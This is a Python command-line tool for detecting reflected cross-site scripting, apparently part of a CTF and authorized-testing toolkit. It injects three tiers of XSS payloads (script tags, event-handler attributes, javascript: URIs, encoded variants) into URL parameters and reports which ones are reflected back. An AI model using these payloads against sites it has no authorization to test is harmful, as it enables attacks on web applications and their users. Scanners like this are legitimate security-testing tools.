#!/usr/bin/env python3
"""
web/xss_scanner.py — Reflected XSS detection for CTF & authorized testing
NuRichter · CySec Arsenal

Usage:
    python web/xss_scanner.py -u "http://target.ctf/search?q=test"
    python web/xss_scanner.py -u "http://target.ctf/search?q=test" --param q --level 2
"""
import argparse
import sys
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from utils import ok, warn, err, info, found, get_logger

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("Install: pip install requests")
    sys.exit(1)

log = get_logger("xss_scanner")

HEADERS = {"User-Agent": "Mozilla/5.0 (cysec-arsenal/1.0 CTF)"}

# Unique marker embedded in each payload to detect reflection
MARKER = "XSSMARK"

PAYLOADS_L1 = [
    f'<{MARKER}>',
    f'<script>{MARKER}</script>',
    f'"><{MARKER}>',
    f"'><{MARKER}>",
    f'<img src=x onerror="{MARKER}">',
]

PAYLOADS_L2 = PAYLOADS_L1 + [
    f'<svg onload="{MARKER}">',
    f'javascript:{MARKER}',
    f'<body onload="{MARKER}">',
    f'<input autofocus onfocus="{MARKER}">',
    f'<details open ontoggle="{MARKER}">',
    f'<iframe src="javascript:{MARKER}">',
    f'"-prompt({MARKER})-"',
    f"'`;alert('{MARKER}')//",
    f'<img src=1 href=1 onerror="javascript:{MARKER}">',
]

PAYLOADS_L3 = PAYLOADS_L2 + [
    f'<math><mtext></table><img src=/{MARKER}>',
    f'<isindex type=image src=1 onerror={MARKER}>',
    f'<object data="data:text/html,<script>{MARKER}</script>">',
    f'<base href="{MARKER}">',
    f'%3Cscript%3E{MARKER}%3C/script%3E',
    urllib.parse.quote(f'<script>{MARKER}</script>'),
    f'&lt;script&gt;{MARKER}&lt;/script&gt;',
]

PAYLOADS_BY_LEVEL = {1: PAYLOADS_L1, 2: PAYLOADS_L2, 3: PAYLOADS_L3}


class XSSScanner:
    def __init__(self, url: str, param: str = "", level: int = 1,
                 timeout: float = 8.0):
        self.url = url
        self.target_param = param
        self.level = level
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.verify = False
        self.findings: list[dict] = []

    def _params(self) -> list[str]:
        qs = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(self.url).query))
        if self.target_param and self.target_param in qs:
            return [self.target_param]
        return list(qs.keys())

    def _inject(self, param: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(self.url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        qs[param] = payload
        return parsed._replace(query=urllib.parse.urlencode(qs)).geturl()

    def test_reflected(self, param: str) -> list[dict]:
        results = []
        payloads = PAYLOADS_BY_LEVEL[self.level]
        for payload in payloads:
            injected = self._inject(param, payload)
            try:
                resp = self.session.get(injected, timeout=self.timeout)
            except Exception as e:
                print(warn(f"Request error: {e}"))
                continue

            # Check if MARKER is reflected in raw HTML
            if MARKER in resp.text:
                # Check if it appears in an executable context (not just as text)
                ctx = self._detect_context(resp.text, payload)
                msg = f"[XSS-REFLECTED] param={param} context={ctx} payload={repr(payload[:50])}"
                print(found(msg))
                log.warning(msg)
                results.append({
                    "type": "reflected",
                    "param": param,
                    "payload": payload,
                    "context": ctx,
                    "url": injected,
                })
        return results

    def _detect_context(self, html: str, payload: str) -> str:
        """Rough context detection for triage."""
        idx = html.find(MARKER)
        if idx == -1:
            return "unknown"
        snippet = html[max(0, idx - 50): idx + 50]
        if "<script" in snippet.lower():
            return "script-tag"
        if "onerror=" in snippet or "onload=" in snippet or "onclick=" in snippet:
            return "event-handler"
        if "href=" in snippet or "src=" in snippet:
            return "attribute-url"
        if snippet.startswith("<") or ">" in snippet[:10]:
            return "html-tag"
        return "text-node"

    def run(self) -> list[dict]:
        params = self._params()
        if not params:
            print(warn("No GET parameters detected."))
            return []
        print(info(f"Scanning {len(params)} param(s): {params}  (Level {self.level})\n"))
        for param in params:
            print(info(f"Testing parameter: {param}"))
            self.findings.extend(self.test_reflected(param))
        return self.findings


def main():
    parser = argparse.ArgumentParser(
        description="XSS Scanner (CTF/Authorized) — NuRichter CySec Arsenal"
    )
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("--param", default="", help="Specific parameter to fuzz")
    parser.add_argument("--level", type=int, default=1, choices=[1, 2, 3])
    parser.add_argument("--timeout", type=float, default=8.0)
    args = parser.parse_args()

    print(f"\n{'='*60}")
    print(f"  URL   : {args.url}")
    print(f"  LEVEL : {args.level}")
    print(f"{'='*60}\n")

    scanner = XSSScanner(args.url, args.param, args.level, args.timeout)
    findings = scanner.run()

    print(f"\n{'='*60}")
    if findings:
        print(found(f"{len(findings)} XSS reflection(s) detected!"))
        for f in findings:
            print(f"  [{f['context']}] {f['param']} → {f['url'][:80]}")
    else:
        print(ok("No XSS reflections detected."))
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
